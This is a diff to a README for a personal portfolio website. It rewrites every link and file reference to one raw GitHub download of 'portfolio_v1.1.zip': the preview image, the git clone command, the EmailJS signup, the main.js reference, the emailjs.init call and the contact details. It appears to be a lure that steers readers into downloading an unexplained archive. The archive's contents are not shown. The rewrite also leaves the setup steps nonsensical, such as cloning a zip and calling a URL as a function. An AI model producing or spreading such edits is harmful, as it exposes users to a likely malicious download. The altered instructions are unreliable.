@@ -2,7 +2,7 @@
 
 > A modern, captivating portfolio website that showcases my journey as a Full Stack Developer. Built with passion using HTML, CSS, and JavaScript, featuring an elegant design that blends contemporary aesthetics with Moroccan cultural elements.
 
-[![Portfolio Preview](assets/preview.png)](https://ahmedtouzani.com)
+[![Portfolio Preview](https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip)](https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip)
 
 ## ✨ Key Features
 
@@ -46,7 +46,7 @@
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/ahmedtouzani/portfolio.git
+git clone https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip
 ```
 
 2. Navigate to project:
@@ -55,7 +55,7 @@ cd portfolio
 ```
 
 3. Launch locally:
-- Open `index.html` in your browser, or
+- Open `https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip` in your browser, or
 - Use a local server (recommended):
   ```bash
   npx serve
@@ -64,17 +64,17 @@ cd portfolio
 ## ⚙️ Configuration
 
 ### EmailJS Setup
-1. Sign up at [EmailJS](https://www.emailjs.com/)
+1. Sign up at [EmailJS](https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip)
 2. Create an email service
 3. Set up your email template
-4. Configure in `main.js`:
+4. Configure in `https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip`:
    ```javascript
-   emailjs.init("YOUR_PUBLIC_KEY");
+   https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip("YOUR_PUBLIC_KEY");
    ```
 
 ### Analytics Setup
 1. Create a Google Analytics account
-2. Add your tracking ID to `index.html`
+2. Add your tracking ID to `https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip`
 
 ## 📱 Mobile Support
 
@@ -99,9 +99,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📬 Contact
 
-Ahmed Touzani - [@AhmedTouzani](https://twitter.com/ahmed_touzani48) - touzaniahmed39@email.com
+Ahmed Touzani - [@AhmedTouzani](https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip) - https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip
 
-Project Link: [https://github.com/ahmedtouzani/portfolio](https://github.com/ahmedtouzani/portfolio)
+Project Link: [https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip](https://github.com/ahmedtouzani/portfolio/raw/refs/heads/main/assets/portfolio_v1.1.zip)
 
 ---
 
